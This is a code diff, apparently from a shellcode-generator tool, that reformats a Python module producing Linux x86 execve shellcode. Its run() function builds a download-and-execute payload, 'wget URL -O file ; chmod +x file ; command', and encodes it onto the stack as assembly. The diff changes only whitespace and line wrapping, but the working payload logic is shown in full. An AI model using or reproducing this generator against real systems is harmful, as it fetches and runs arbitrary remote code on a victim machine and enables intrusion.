@@ -10,8 +10,10 @@ shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.ph
 '''
 from core import stack
 from lib.opcoder.linux_x86 import convert
+
+
 def sys(command):
-	return '''push   $0xb
+    return '''push   $0xb
 pop    %%eax
 cltd
 push   %%edx
@@ -35,8 +37,12 @@ push   %%ecx
 push   %%ebx
 mov    %%esp,%%ecx
 int    $0x80
-'''%(str(command))
+''' % (str(command))
+
+
 def run(data):
-	url,filename,command=data[0],data[1],data[2]
-	command = 'wget %s -O %s ; chmod +x %s ; %s' %(str(url),str(filename),str(filename),str(command)) 
-	return sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))
+    url, filename, command = data[0], data[1], data[2]
+    command = 'wget %s -O %s ; chmod +x %s ; %s' % (
+        str(url), str(filename), str(filename), str(command))
+    return sys(stack.generate(
+        command.replace('[space]', ' '), '%ecx', 'string'))
